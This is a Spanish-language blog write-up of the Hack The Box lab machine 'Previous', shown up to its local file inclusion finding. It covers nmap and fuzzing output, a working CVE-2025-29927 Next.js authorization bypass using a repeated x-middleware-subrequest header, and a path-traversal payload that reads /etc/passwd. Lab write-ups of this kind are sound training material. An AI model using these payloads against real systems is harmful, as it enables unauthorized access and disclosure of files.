<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Previous - Hack The Box" />
<meta property="og:locale" content="en" />
<meta name="description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
<meta property="og:description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
<link rel="canonical" href="http://localhost:4000/posts/previous/" />
<meta property="og:url" content="http://localhost:4000/posts/previous/" />
<meta property="og:site_name" content="MrIncreibl3" />
<meta property="og:image" content="http://localhost:4000/assets/img/htb-writeup-previous/previous.png" />
<meta property="og:image:alt" content="previous" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-10-31T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/htb-writeup-previous/previous.png" />
<meta name="twitter:image:alt" content="previous" />
<meta property="twitter:title" content="Previous - Hack The Box" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-10-31T00:00:00+00:00","datePublished":"2025-10-31T00:00:00+00:00","description":"A minimal, responsive and feature-rich Jekyll theme for technical writing.","headline":"Previous - Hack The Box","image":{"alt":"previous","url":"http://localhost:4000/assets/img/htb-writeup-previous/previous.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/previous/"},"url":"http://localhost:4000/posts/previous/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Previous - Hack The Box | MrIncreibl3
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="MrIncreibl3">
<meta name="application-name" content="MrIncreibl3">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    
      <link rel="preconnect" href="https://cdnjs.cloudflare.com" >
      <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/logo.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">MrIncreibl3</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Pentester , CTF player  HackTheBox RedTeam</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/MrIncreible3"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['',''].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Previous - Hack The Box</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Previous - Hack The Box</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1761868800"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Oct 31, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/htb-writeup-previous/previous.png" class="popup img-link preview-img shimmer"><img src="/assets/img/htb-writeup-previous/previous.png"  alt="previous" width="1200" height="630"  loading="lazy"></a><figcaption class="text-center pt-2 pb-2">previous</figcaption></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://github.com/MrIncreibl3">MrIncreibl3</a>
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="3050 words"
>
  <em>16 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p><a href="/assets/img/htb-writeup-previous/previous-logo.png" class="popup img-link right shimmer"><img src="/assets/img/htb-writeup-previous/previous-logo.png" alt="logo"  width="200" height="200" loading="lazy"></a></p>

<p>La maquina <code class="language-plaintext highlighter-rouge">PREVIOUS</code> de Hack The Box es un entorno de dificultad media que toca una vulnerabilidad de NextJS reciente en el 2025 catalogada como <code class="language-plaintext highlighter-rouge">CVE-2025-29927</code> esta nos permitio bypassear endpoints de la aplicacion y encontrar credenciales de acceso por ssh. Una vez dentro del sistema enumeramos bien para encontrar alguna via de escalada sin embargo nos encontramos con un binario que se puede ejecutar como ROOT (con privilegios SUDO), entendiendo el funcionamiento de <code class="language-plaintext highlighter-rouge">TERRAFORM</code> nos vimos obligados a leer la documentacion y asi escalamos a root.</p>

<h2 id="reconocimiento"><span class="me-2">Reconocimiento</span><a href="#reconocimiento" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="nmap"><span class="me-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Como primera medidad nos vamos a encargar de realizar un escaneo rapido y preciso con <code class="language-plaintext highlighter-rouge">nmap</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.83
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-10-31 14:04 CET
Initiating SYN Stealth Scan at 14:04
Scanning 10.10.11.83 <span class="o">[</span>65535 ports]
Discovered open port 22/tcp on 10.10.11.83
Discovered open port 80/tcp on 10.10.11.83
Completed SYN Stealth Scan at 14:04, 15.06s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.11.83
Host is up, received user-set <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2025-10-31 14:04:38 CET <span class="k">for </span>15s
Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>15.15 seconds
           Raw packets sent: 73488 <span class="o">(</span>3.233MB<span class="o">)</span> | Rcvd: 73486 <span class="o">(</span>2.939MB<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>PORT 22
    <ul>
      <li>SSH</li>
    </ul>
  </li>
  <li>PORT 80
    <ul>
      <li>HTTP</li>
    </ul>
  </li>
</ul>

<p>El escaneo nos muestra 2 puertos abiertos, son los tipicos puertos que nos encontramos en una maquina de HTB… Ya sabemos que la intrusion puede ser por <code class="language-plaintext highlighter-rouge">SSH</code></p>

<h3 id="nmap-servicios-y-puertos"><span class="me-2">Nmap Servicios y Puertos</span><a href="#nmap-servicios-y-puertos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-p22</span>,80 <span class="nt">-sCV</span> 10.10.11.83
Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-10-31 14:08 CET
Nmap scan report <span class="k">for </span>10.10.11.83
Host is up <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to http://previous.htb/
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>19.45 seconds
</pre></td></tr></tbody></table></code></div></div>

<p>Para ver a que nos estamos enfrentado es bueno saber escanear los servicios que corren en cada puerto. Tambien vemos un dominio <code class="language-plaintext highlighter-rouge">previous.htb</code>, esto vamos a escribirlo en nuestro <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"10.10.11.83 previous.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></td></tr></tbody></table></code></div></div>

<h2 id="web"><span class="me-2">Web</span><a href="#web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p><a href="/assets/img/htb-writeup-previous/previous1.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-previous/previous1.png" alt="" loading="lazy"></a></p>

<p>Esta es la web que corre por el puerto 80, si le pasamos un escaneo rapido con <code class="language-plaintext highlighter-rouge">wappalayzer</code> nos salen estas tecnologias… <code class="language-plaintext highlighter-rouge">Next.js</code>, <code class="language-plaintext highlighter-rouge">React</code>.</p>

<ul>
  <li>PreviousJS
    <ul>
      <li>Next.js en su version 15.2.2</li>
    </ul>
  </li>
</ul>

<p>Antes de empezar a cazar esta amenaza buscando y investigando sobre la version de <code class="language-plaintext highlighter-rouge">Next.JS</code>, podemos observar que esta web es estatica hasta que le damos click al boton <code class="language-plaintext highlighter-rouge">Get Started</code> esta accion nos reenvia a un panel de login que se encuentra en una <code class="language-plaintext highlighter-rouge">API</code></p>

<p><a href="/assets/img/htb-writeup-previous/previous2.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-previous/previous2.png" alt="" loading="lazy"></a></p>

<h3 id="enumeracion-web-fuzz"><span class="me-2">Enumeracion Web Fuzz</span><a href="#enumeracion-web-fuzz" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="c"># Dirsearch started Sat Aug 30 18:25:55 2025 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://previous.htb/api -H x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</span>

308    22B   http://previous.htb/api/%2e%2e//google.com    -&gt; REDIRECTS TO: /api/%2E%2E/google.com
400    64B   http://previous.htb/api/auth/adm
400    64B   http://previous.htb/api/auth/login
400    64B   http://previous.htb/api/auth/admin
400    64B   http://previous.htb/api/auth/login.aspx
400    64B   http://previous.htb/api/auth/login.php
400    64B   http://previous.htb/api/auth/login.html
400    64B   http://previous.htb/api/auth/login.js
400    64B   http://previous.htb/api/auth/login.jsp
400    64B   http://previous.htb/api/auth/logon
302     0B   http://previous.htb/api/auth/signin    -&gt; REDIRECTS TO: /signin?callbackUrl<span class="o">=</span>http%3A%2F%2Flocalhost%3A3000
308    23B   http://previous.htb/api/axis//happyaxis.jsp    -&gt; REDIRECTS TO: /api/axis/happyaxis.jsp
308    28B   http://previous.htb/api/axis2-web//HappyAxis.jsp    -&gt; REDIRECTS TO: /api/axis2-web/HappyAxis.jsp
308    34B   http://previous.htb/api/axis2//axis2-web/HappyAxis.jsp    -&gt; REDIRECTS TO: /api/axis2/axis2-web/HappyAxis.jsp
308    56B   http://previous.htb/api/Citrix//AccessPlatform/auth/clientscripts/cookies.js    -&gt; REDIRECTS TO: /api/Citrix/AccessPlatform/auth/clientscripts/cookies.js
400    28B   http://previous.htb/api/download
308    46B   http://previous.htb/api/engine/classes/swfupload//swfupload_f9.swf    -&gt; REDIRECTS TO: /api/engine/classes/swfupload/swfupload_f9.swf
308    43B   http://previous.htb/api/engine/classes/swfupload//swfupload.swf    -&gt; REDIRECTS TO: /api/engine/classes/swfupload/swfupload.swf
308    31B   http://previous.htb/api/extjs/resources//charts.swf    -&gt; REDIRECTS TO: /api/extjs/resources/charts.swf
308    41B   http://previous.htb/api/html/js/misc/swfupload//swfupload.swf    -&gt; REDIRECTS TO: /api/html/js/misc/swfupload/swfupload.swf
</pre></td></tr></tbody></table></code></div></div>

<p>En esta maquina vamos a usar la herramienta <code class="language-plaintext highlighter-rouge">dirsearch</code>, es parecida a <code class="language-plaintext highlighter-rouge">feroxbuster</code>. Estas herramientas son geniales porque agiliza el fuzzeo en muchos sentidos.</p>

<p>En este reporte que nos deja dirsearch podemos encontrar <code class="language-plaintext highlighter-rouge">/api/download</code>, quiero ver de que se trata este endpoint.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="s2">"http://previous.htb/api/download"</span> <span class="nt">-I</span>
HTTP/1.1 307 Temporary Redirect
Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Date: Fri, 31 Oct 2025 13:39:15 GMT
Connection: keep-alive
location: /api/auth/signin?callbackUrl<span class="o">=</span>%2Fapi%2Fdownload
</pre></td></tr></tbody></table></code></div></div>

<p>Cuando realizamos un curl nos redirige a <code class="language-plaintext highlighter-rouge">/api/auth/signin?callbackUrl=%2Fapi%2Fdownload</code>, en este punto ya es hora de indagar por la version de <code class="language-plaintext highlighter-rouge">Next.JS</code></p>

<h3 id="cve-2025-29927"><span class="me-2">CVE-2025-29927</span><a href="#cve-2025-29927" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>BIEN!!! Existe un CVE para esta version de <code class="language-plaintext highlighter-rouge">Next.JS</code></p>

<p>Las versiones afectadas de este paquete son vulnerables a una autorización incorrecta debido al manejo inadecuado de la cabecera <code class="language-plaintext highlighter-rouge">x-middleware-subrequest</code>. Un atacante puede eludir las comprobaciones de autorización enviando solicitudes manipuladas que contengan esta cabecera específica.</p>

<p>Comparto el PoC esta vulnerabilidad de <a href="https://github.com/lirantal/vulnerable-nextjs-14-CVE-2025-29927">Next.JS</a></p>

<p>Para que se entienda mejor la vuln, si enjaulamos en una cabezera 5 veces <code class="language-plaintext highlighter-rouge">x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</code> podremos bypassear el endpoint <code class="language-plaintext highlighter-rouge">/api/download</code> y ver su contenido sin estar registrado o tener alguna credencial de acceso.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="s2">"http://previous.htb/api/download"</span> <span class="nt">-H</span> <span class="s1">'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'</span> | jq
<span class="o">{</span>
  <span class="s2">"error"</span>: <span class="s2">"Invalid filename"</span>
<span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Excelente, parece que esta funcionando!!!… Antes solo veiamos un <code class="language-plaintext highlighter-rouge">ERROR 307</code>, ahora vemos un <code class="language-plaintext highlighter-rouge">invalid filename</code> esto quiere decir que estamos logrando bypassear las restricciones.</p>

<p>Lo que se me ocurre en este punto es fuzzear por parametros validos.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre>ffuf <span class="nt">-u</span> <span class="s1">'http://previous.htb/api/download?FUZZ=aaa'</span> <span class="nt">-w</span> AllParam.txt <span class="nt">-H</span> <span class="s2">"x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</span> <span class="nt">-mc</span> all <span class="nt">-fw</span> 2

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://previous.htb/api/download?FUZZ=aaa
 :: Wordlist         : FUZZ: /home/mrincreible/HTB/previous/AllParam.txt
 :: Header           : X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 2
________________________________________________

example                 [Status: 404, Size: 26, Words: 3, Lines: 1, Duration: 322ms]
:: Progress: [7083/74332] :: Job [1/1] :: 211 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
</span></pre></td></tr></tbody></table></code></div></div>

<p>Muy bien!. Encontramos un parametro valido <code class="language-plaintext highlighter-rouge">example</code>. Si este parametro es correcto entonces puedo probar con algun diccionario para buscar algun <code class="language-plaintext highlighter-rouge">LFI</code> ya que el endpoint esta tratando de tomar algun archivo.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404,504 <span class="nt">-t</span> 100 <span class="nt">-w</span> lfi.txt <span class="nt">-u</span> <span class="s1">'http://previous.htb/api/download?example=FUZZ'</span> <span class="nt">-H</span> <span class="s2">"x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Con wfuzz construi este comando para incluir archivos del sistema y derivarlo a un LFI.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://previous.htb/api/download?example<span class="o">=</span>FUZZ
Total requests: 70466

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                                                                                    
<span class="o">=====================================================================</span>

000000281:   200        19 L     19 W       787 Ch      <span class="s2">"..%2f..%2f..%2f/etc/passwd"</span>                                                                               
